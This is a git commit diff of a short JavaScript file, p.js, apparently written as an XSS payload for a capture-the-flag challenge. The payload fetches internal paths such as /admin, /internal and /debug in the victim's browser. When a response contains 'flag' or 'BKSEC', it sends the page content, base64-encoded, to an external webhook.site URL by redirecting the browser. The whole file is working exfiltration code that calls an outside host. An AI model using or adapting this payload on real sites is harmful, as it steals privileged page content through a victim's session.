ec78e78851e47352c58c8c5e40b4124561f4dfb4
NguyenKhacHoangPhuc <tenemailcuaem@gmail.com>
2026-03-05 01:41:35 +0700

    u1

--- p.js
+++ p.js
@@ -1,11 +1,11 @@
 (async()=>{
-let p=["/admin","/dashboard","/security","/internal","/debug","/reports"];
+let p=["/","/admin","/dashboard","/security","/internal","/debug","/reports","/security-dashboard","/admin-panel"];
 for(let x of p){
  try{
   let r=await fetch(x);
   let t=await r.text();
-  if(r.status!=404){
-   location="https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89?d="+btoa(x+":"+t);
+  if(t.includes("flag")||t.includes("BKSEC")){
+   location="https://webhook.site/aef63664-4b2b-4a25-a695-c21c1fdd7a89?d="+btoa(t);
    break;
   }
  }catch(e){}
